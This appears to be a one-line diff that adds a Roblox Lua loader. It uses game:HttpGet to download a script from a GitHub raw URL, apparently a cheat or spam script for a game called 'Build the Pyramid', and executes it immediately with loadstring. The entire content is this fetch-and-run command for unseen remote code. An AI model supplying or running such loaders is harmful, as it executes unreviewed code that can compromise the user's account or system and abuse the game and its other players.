@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/build-the-pyramid-spam6-fsmzcv2ievzi2z.lua"))()
